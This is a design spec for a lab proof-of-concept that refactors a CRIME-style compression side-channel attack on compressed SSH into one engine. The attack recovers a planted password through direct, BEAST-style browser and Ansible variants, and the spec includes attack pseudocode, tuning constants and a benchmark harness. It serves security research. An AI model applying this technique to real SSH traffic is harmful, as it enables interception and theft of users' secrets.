# Unified Attack Engine — Design Spec

**Date:** 2026-04-22
**Status:** approved (pending user review of written spec)
**Scope:** `attacker/attack*.py`, `attacker/mitm.py`, `scripts/*`

## Goal

Rewrite the three drifted attack variants (`direct`, `BEAST`, `ansible`) onto a
single engine so that optimizations can be toggled independently and compared
apples-to-apples across variants. The primary output is a benchmark matrix of
guess counts (min / max / avg / total, per-attack and per-position) under
different optimization scenarios on all three variants.

## Non-goals

- No new attack capability. Current correctness (each variant recovers
  `hunter2` end-to-end) must be preserved.
- No changes to the docker-compose topology, the client container, the SSH
  server, Redis, or the Ansible playbook.
- No implementation of the "Two Tries" oracle in this refactor. It is noted as
  future work with an extension point left open in the engine.

## Terminology (normative for this codebase)

| Term | Meaning |
|---|---|
| **secret** | Plaintext injected by the victim; target of the attack. |
| **guess** | Plaintext injected by the attacker to test a single byte of the secret. |
| **alignment data** | Attacker-controlled filler bytes appended to a guess so the resulting wire length crosses an 8-byte chacha20 padding boundary. (Previously called "noise"; renamed because it is not noise in the information-theoretic sense.) |
| **protocol noise** | Uncontrollable data flowing through the shared zlib context (e.g., other channels, SSH framing bytes). Reserved term. |
| **alignment sweep** | Iterating over a set of alignment-data lengths within one round. |
| **round** | One full pass over (active candidates × active alignment lengths). |

All identifiers follow this terminology: `alignment_lengths`, `alignment_mode`,
`_ALIGNMENT_POOL`, `_make_alignment`, `adaptive_alignment`,
`alignment_hint_carryover`.

## Architecture

```
attacker/
  mitm.py                        # single /run_attack endpoint, dispatches on variant
  attack/
    __init__.py                  # re-exports run_attack, AttackConfig, AlignmentMode
    config.py                    # AttackConfig dataclass + AlignmentMode enum
    engine.py                    # run_attack, crack_byte_position (transport-agnostic)
    alignment.py                 # _ALIGNMENT_POOL, _make_alignment
    adapters/
      base.py                    # Adapter protocol + shared helpers
      direct.py                  # raw-TCP tunnel, pre-opened measure channel
      beast.py                   # BrowserBridge + sendBeacon injection
      ansible.py                 # fresh-SSH-per-guess + LocalForward tunnel
scripts/
  verify_direct.py               # rename of verify.py, single-password recovery
  verify_beast.py                # single-password recovery via BEAST adapter
  verify_ansible.py              # single-password recovery via Ansible adapter
  benchmark.py                   # multi-trial, multi-scenario, multi-variant harness
```

**Deleted:** `attacker/attack.py`, `attacker/attack_beast.py`,
`attacker/attack_ansible.py`, `scripts/test_attack.py`,
`scripts/test_attack_ansible.py`, `scripts/test_attack_random.py`,
`scripts/verify.py`.

## Engine / adapter contract

The engine is transport-agnostic. It asks the adapter for one thing only:
given a candidate byte and an alignment-data length, give me the measured
c→s byte count for one oracle query.

```python
class Adapter(Protocol):
    async def setup(self, config: AttackConfig, http_session: aiohttp.ClientSession) -> None: ...
    async def teardown(self) -> None: ...
    async def measure_once(self, prefix: bytes, candidate: bytes, alignment: bytes) -> int: ...

    @classmethod
    def default_config(cls) -> AttackConfig: ...
```

The adapter owns **ordering**: flush / open measure channel / trigger secret /
send guess / read packet log. It also owns the measurement filter
(`measurement_min_segment_size`) for its read. Each adapter supplies a
`default_config()` reflecting what currently works end-to-end for that
variant; scenario presets override optimization toggles on top of that
default, leaving transport-specific constants alone.

### Adapter ordering (preserved from current code)

- **direct**: `flush → open_measure → trigger_secret → send_guess → measure → close`.
- **beast**: `flush (via sendBeacon) → trigger_secret → send_guess (via sendBeacon) → measure` (no pre-opened channel; `sendBeacon` fuses open+data).
- **ansible**: `trigger_ansible → open_measure → send_guess → measure → close` (no flush — fresh SSH per iteration resets the zlib context).

## `AttackConfig` shape

```python
class AlignmentMode(str, Enum):
    FULL_SWEEP   = "full_sweep"    # try every alignment_lengths entry every round
    FIXED_SINGLE = "fixed_single"  # use alignment_lengths[0] only; no sweep

@dataclass
class AttackConfig:
    # Target
    known_prefix: bytes
    alphabet: list[bytes]
    max_length: int
    terminator: bytes

    # Round control
    min_margin: int
    max_rounds: int
    settle: float

    # Alignment
    alignment_mode: AlignmentMode
    alignment_lengths: list[int]

    # Optimization toggles (all independent)
    candidate_elimination: bool
    constant_prefix_trim: bool
    adaptive_alignment: bool
    stall_detection: bool
    alignment_hint_carryover: bool

    # Baked in, always on, tunable
    outlier_threshold: int   # drop+retry round if max-min exceeds; 0 disables

    # Transport knobs (adapter-tuned defaults)
    flush_bytes: int
    flush_pool: Literal["secrets_random", "high_ascii", "none"]
    measurement_min_segment_size: int

    # Harness bookkeeping (propagated back in result, no effect on attack)
    label: str = ""
```

### Scenario-override semantics

`benchmark.py` constructs the final config by starting from
`Adapter.default_config()` and overriding only the fields named by the
scenario preset. Transport-specific knobs (`settle`, `flush_bytes`,
`flush_pool`, `measurement_min_segment_size`, `outlier_threshold`) are
never touched by presets, so each variant remains tuned to its transport
while the optimization toggles vary.

### Optimization semantics (normative)

- **`candidate_elimination`**: after each round, drop candidates whose
  cumulative sum exceeds `best_sum + min_margin`.
- **`constant_prefix_trim`**: after each recovered byte, trim the head of
  `known_prefix + recovered` so that `len(prefix + candidate)` stays
  constant across positions.
- **`adaptive_alignment`**: after round 1, drop alignment lengths that
  showed zero spread across candidates. Keep every productive nl plus
  its two neighbours (wrap mod `len(alignment_lengths)`); minimum 3
  entries retained.
- **`stall_detection`**: if `margin` does not grow for 2 consecutive
  rounds and no candidate was eliminated, expand `active_alignment` by
  ±1 (wrap). Resets stall counter.
- **`alignment_hint_carryover`**: when `adaptive_alignment` narrows the
  sweep to one winning nl, carry `{nl}` forward as the next position's
  starting set. Rewrites the current broken `(nl − 1) mod 8` shift. If
  `stall_detection` is off and the nl genuinely shifts, the attack will
  stall until `max_rounds`; this is accepted behaviour — the combination
  is a valid scenario to measure.
- **`outlier_threshold`**: always evaluated after each round. If
  `max − min > threshold` across the round's measurements, discard the
  round and retry. `threshold == 0` disables. Baked in (not a toggle)
  because BEAST's connection reuse can silently produce invalid rounds
  that poison the ranking; a per-variant threshold lets the other
  variants stay permissive.

## Engine flow

### `run_attack(adapter, config, packet_log) -> dict`

```
await adapter.setup(config, session)
recovered = b""
per_position = []
prev_successful_nl = None

for pos in range(config.max_length):
    full_prefix = known_prefix + recovered
    if config.constant_prefix_trim:
        full_prefix = full_prefix[max(0, len(full_prefix) - len(known_prefix)):]

    initial_alignment = select_initial_alignment(config, prev_successful_nl)

    best, pos_info = await crack_byte_position(
        adapter, config, full_prefix, initial_alignment, pos,
    )
    per_position.append(pos_info)
    prev_successful_nl = pos_info["successful_alignment"]

    if best == config.terminator:
        break
    recovered += best

await adapter.teardown()
return {
    "recovered": recovered.decode("latin-1"),
    "elapsed_seconds": elapsed,
    "total_guesses": sum(p["guesses"] for p in per_position),
    "per_position": per_position,
    "config_label": config.label,
}
```

`select_initial_alignment`:
- `FIXED_SINGLE` → `[alignment_lengths[0]]`.
- `FULL_SWEEP` + no carryover hint → `list(alignment_lengths)`.
- `FULL_SWEEP` + `alignment_hint_carryover` + `prev_successful_nl is not None`
  → `[prev_successful_nl]`.

### `crack_byte_position` (round control)

```
sums = {c: 0 for c in alphabet}
active_candidates = list(alphabet)
active_alignment  = initial_alignment
guesses = 0
prev_margin = 0
stall_count = 0

for rnd in range(1, max_rounds + 1):
    # One round with outlier retry
    while True:
        per_nl = {nl: {} for nl in active_alignment}
        for nl in active_alignment:
            for c in active_candidates:
                guesses += 1
                per_nl[nl][c] = await adapter.measure_once(
                    prefix, c, _make_alignment(nl),
                )
        flat = [v for m in per_nl.values() for v in m.values()]
        if config.outlier_threshold == 0 or max(flat) - min(flat) <= config.outlier_threshold:
            break
        # retry: flat discarded

    for c in active_candidates:
        sums[c] += sum(per_nl[nl][c] for nl in active_alignment)
    ranked = sorted(active_candidates, key=lambda c: sums[c])
    best = ranked[0]
    margin = sums[ranked[1]] - sums[best] if len(ranked) > 1 else 0
    eliminated = 0

    if config.candidate_elimination:
        before = len(active_candidates)
        active_candidates = [c for c in ranked if sums[c] - sums[best] < config.min_margin]
        if len(active_candidates) < 2:
            active_candidates = ranked[:2]
        eliminated = before - len(active_candidates)

    # Modulus is the chacha20 padding granularity (typically 8), recovered
    # from the configured alignment set as max(alignment_lengths) + 1 to
    # match the original code's `noise_lengths[-1] + 1`.
    n = max(config.alignment_lengths) + 1

    if config.adaptive_alignment and rnd == 1:
        productive = {nl for nl, m in per_nl.items() if min(m.values()) < max(m.values())}
        if productive:
            keep = set()
            for nl in productive:
                keep.add(nl)
                keep.add((nl - 1) % n)
                keep.add((nl + 1) % n)
            new_alignment = sorted(keep & set(config.alignment_lengths))
            if len(new_alignment) >= 3:
                active_alignment = new_alignment

    if config.stall_detection:
        if margin <= prev_margin and eliminated == 0:
            stall_count += 1
        else:
            stall_count = 0
        prev_margin = margin
        if stall_count >= 2 and len(active_alignment) < len(config.alignment_lengths):
            expanded = set(active_alignment)
            for nl in list(expanded):
                expanded.add((nl - 1) % n)
                expanded.add((nl + 1) % n)
            active_alignment = sorted(expanded & set(config.alignment_lengths))
            stall_count = 0

    if margin >= config.min_margin:
        break

successful_alignment = _pick_nl_with_largest_gap(per_nl, best)
# Returns the nl with the largest `min(others) - best` gap, or None if no
# nl shows any gap (e.g., only one active candidate left after elimination,
# or all measurements identical). Carryover falls through to full sweep
# when successful_alignment is None.

return best, {
    "position": pos,
    "best": best.decode("latin-1"),
    "guesses": guesses,
    "rounds": rnd,
    "final_margin": margin,
    "successful_alignment": successful_alignment,
    "ranked_top5": [(c.decode("latin-1"), sums[c]) for c in ranked[:5]],
}
```

## HTTP API

Single `/run_attack` endpoint replaces the three current variant-specific
endpoints.

Request:
```json
{
  "variant": "direct|beast|ansible",
  "config": {
    "known_prefix": "...",
    "alphabet": "...",
    "max_length": 32,
    "terminator": "\n",
    "min_margin": 16,
    "max_rounds": 64,
    "settle": 0.003,
    "alignment_mode": "full_sweep",
    "alignment_lengths": [0,1,2,3,4,5,6,7],
    "candidate_elimination": true,
    "constant_prefix_trim": true,
    "adaptive_alignment": true,
    "stall_detection": true,
    "alignment_hint_carryover": true,
    "outlier_threshold": 32,
    "flush_bytes": 33000,
    "flush_pool": "secrets_random",
    "measurement_min_segment_size": 0,
    "label": "all-opts"
  }
}
```

Every `config.*` field is optional; omitted fields fall back to the
variant's `default_config()`.

Response:
```json
{
  "ok": true,
  "variant": "direct",
  "config_label": "all-opts",
  "recovered": "hunter2",
  "elapsed_seconds": 246.0,
  "total_guesses": 3456,
  "per_position": [
    {"position": 0, "best": "h", "guesses": 432, "rounds": 4,
     "final_margin": 18, "successful_alignment": 1,
     "ranked_top5": [["h", 5120], ["t", 5138], ["b", 5139], ["m", 5141], ["a", 5142]]},
    ...
  ]
}
```

The engine does not know the expected value and cannot report success; the
harness compares `recovered` against the planted value.

## Benchmark harness (`scripts/benchmark.py`)

### CLI shape

```
python scripts/benchmark.py \
    --stacks 8 \
    --trials 100 \
    --variants direct,beast,ansible \
    --scenario all-opts
```

New flags:
- `--scenario {baseline,full-sweep,fixed-nl,all-opts}` — named preset; builds
  the config override shipped in each `/run_attack` call.
- `--fixed-nl N` — required when `--scenario fixed-nl`; passed through as
  `alignment_lengths=[N]`.
- `--config path.json` — bypass presets; use raw config overrides per variant
  from the given JSON (map of variant → override object).

### Scenario presets (override dicts; everything not listed inherits from `Adapter.default_config()`)

| preset | `alignment_mode` | `candidate_elimination` | `constant_prefix_trim` | `adaptive_alignment` | `stall_detection` | `alignment_hint_carryover` |
|---|---|---|---|---|---|---|
| `baseline` | `FULL_SWEEP` | off | on | off | off | off |
| `full-sweep` | `FULL_SWEEP` | on | on | off | off | off |
| `fixed-nl` | `FIXED_SINGLE` | on | on | off | off | off |
| `all-opts` | `FULL_SWEEP` | on | on | on | on | on |

`outlier_threshold` is always inherited from the adapter default (always on).

### Output

Two artefacts:

1. **`benchmark_results.json`** — per-trial rows including `per_position`
   breakdown, for full post-hoc analysis.
2. **`benchmark_summary.csv`** — one row per `(scenario, variant)` with:
   - Per-attack: `trials_total`, `trials_passed`, `min_guesses`, `max_guesses`,
     `avg_guesses`, `total_guesses`.
   - Per-position: `position_count`, `min_per_position`, `max_per_position`,
     `avg_per_position`.

The per-position aggregate is computed over `trials_passed × recovered_length`
samples (only successful trials contribute).

### Correctness gate

A trial "passes" iff `recovered == planted_password`. Failures are counted
and reported in the summary but do not contribute to guess aggregates.

## Verify scripts

Each variant gets a single-password recovery script. They keep the
transport-specific preconditions checks they have today (SSH up,
compression negotiated, tunnel active, browser connected for BEAST,
ansible LocalForward declared for ansible); only the attack invocation
is rewired to the new `/run_attack` endpoint with `{"variant":
"<name>"}` and no config overrides (= variant default).

- `scripts/verify_direct.py` — rename of existing `verify.py`.
- `scripts/verify_beast.py` — updated in place.
- `scripts/verify_ansible.py` — updated in place.

Each performs the two-phase attack against `hunter2` and asserts
recovery. These are the first-line regression test after any engine edit;
`benchmark.py --trials N` is the heavier regression.

## Variant `default_config()` (preserves current end-to-end behaviour)

**direct**
```
min_margin=16, max_rounds=64, settle=0.003,
alignment_mode=FULL_SWEEP, alignment_lengths=[0..7],
candidate_elimination=on, constant_prefix_trim=on,
adaptive_alignment=on, stall_detection=on, alignment_hint_carryover=on,
outlier_threshold=0 (direct shows clean rounds today; keep permissive),
flush_bytes=33000, flush_pool="secrets_random",
measurement_min_segment_size=0.
```

**beast**
```
min_margin=64, max_rounds=64, settle=0.01,
alignment_mode=FULL_SWEEP, alignment_lengths=[0..7],
candidate_elimination=on, constant_prefix_trim=on,
adaptive_alignment=off (current behaviour), stall_detection=off,
alignment_hint_carryover=off,
outlier_threshold=32,
flush_bytes=33000, flush_pool="high_ascii",
measurement_min_segment_size=100.
```

**ansible**
```
min_margin=8, max_rounds=96, settle=0.1,
alignment_mode=FULL_SWEEP, alignment_lengths=[0..7],
candidate_elimination=on, constant_prefix_trim=on,
adaptive_alignment=off, stall_detection=off, alignment_hint_carryover=off,
outlier_threshold=0,
flush_bytes=0, flush_pool="none",
measurement_min_segment_size=0.
```

These are the baselines the verify scripts run against. The `baseline`
scenario preset flips `candidate_elimination` and all other opt toggles
off on top of whichever variant is being measured, revealing the cost of
the variant's transport alone.

## Load-bearing constants (preserved verbatim)

These are unchanged from the current code and remain in `alignment.py` or
the relevant adapter. See `README.md` §"Three non-obvious knobs" and
project `CLAUDE.md` for the rationale — the refactor does not revisit
them:

- `_ALIGNMENT_POOL = list(range(0x80, 0x90))` — 8-bit DEFLATE literals.
- `flush_bytes = 33000`, random content.
- `direct` flush pool: `secrets.token_bytes`; `beast` flush pool:
  `random.choices(range(0x80, 0x100), ...)`.
- `min_margin` defaults: 16 (direct), 64 (BEAST), 8 (ansible).
- Constant-length prefix trimming logic (unchanged).
- Direct ordering: flush → open_measure → trigger_secret → send_guess.
- BEAST `measurement_min_segment_size = 100` to isolate the
  `CHANNEL_DATA` packet from `CHANNEL_OPEN` jitter when `sendBeacon()`
  fuses them.
- BEAST `outlier_threshold = 32` for Chrome's TCP-connection-reuse
  anomalies.

## Correctness validation plan

After the refactor lands, the three verify scripts are the acceptance
gate. Each must recover `hunter2`:

1. `python scripts/verify_direct.py` — ~4 min end-to-end.
2. `python scripts/verify_beast.py` — ~20 min end-to-end.
3. `python scripts/verify_ansible.py` — ~10–30 min end-to-end depending
   on hinting.

Only after all three pass do we run `benchmark.py` for scenario data.

## "Two Tries" oracle — feasibility and future work

CRIME (Rizzo & Duong, 2012) proposes a per-candidate oracle that sends
two probes per guess, positioned such that for a correct candidate,
probe B's LZ77 back-reference falls outside the 32 KiB window while
probe A's doesn't. Oracle: `len(A) ≠ len(B)` ⇔ correct. False-positive
free, so `min_margin → 0` and `rounds → 1` in principle.

**Implementable in this PoC.** The 33 KiB flush is already the primitive
that pushes data out of the window. A Two-Tries variant would be:
- Probe A = current measure path.
- Probe B = flush-then-measure, with the flush sized to evict the
  secret but not the prefix.

**Not in this refactor because:**

1. The alignment-boundary problem is orthogonal. chacha20's 8-byte
   padding still swallows the 8-bit signal at most alignment lengths, so
   Two Tries would still need an alignment sweep. Cost per candidate
   doubles rather than collapses.
2. All three adapters need a second injection path with flush
   interleaving. BEAST's `sendBeacon()` fuses open+data and would need
   two dispatches plus per-dispatch measurement filtering.
3. Zlib matching edge cases (candidate byte appearing elsewhere within
   32 KiB) require an additional inter-probe reset.

**Extension point.** `AttackConfig` reserves room for an `oracle_mode:
Literal["differential", "two_tries"] = "differential"` field (not in the
initial dataclass, but intentionally the field to add when Two Tries is
implemented). Engine logic is isolated to `crack_byte_position`'s round
body; adding a second oracle mode is an additive change.

## Other literature optimizations reviewed

| Technique | Source | In scope? |
|---|---|---|
| SPDY base-length single-reference oracle | CRIME pp. 25–31 | No — weaker candidate_elimination; doesn't address alignment |
| TLS 16K-1 record-boundary trick | CRIME pp. 32–34 | No — depends on TLS's per-record zlib reset; SSH doesn't reset |
| BREACH Huffman-carry two-byte recovery | BREACH slides | No — DEFLATE-implementation-specific, overkill for this alphabet |
| HEIST timing-inferred compressed length | HEIST 2016 | No — we already have direct packet-size observation via scapy |

## Migration

1. Land engine + adapters under `attacker/attack/`, wired into `mitm.py`
   through the single `/run_attack` endpoint. Keep old endpoints
   temporarily as shim redirects so mid-migration verify runs still
   work.
2. Rewrite `scripts/verify_{direct,beast,ansible}.py` against the new
   endpoint; delete `scripts/test_attack*.py`.
3. Run all three verify scripts; confirm `hunter2` recovery on each.
4. Remove the shim redirects; delete `attacker/attack.py`,
   `attack_beast.py`, `attack_ansible.py`.
5. Extend `benchmark.py` with `--scenario` / `--fixed-nl` / `--config`
   and the per-position aggregation; regenerate the baseline run.

Each step leaves the system in a working state.

## Out of scope (explicit)

- Two Tries oracle implementation.
- Support for non-`chacha20-poly1305` ciphers (the wire-byte analysis is
  specific to the 8-byte padding boundary).
- Any SSH-level mitigation or protocol extension.
- Host-side tooling (zlib-viz, .bin generators, LD_PRELOAD deflate shim)
  is unaffected.
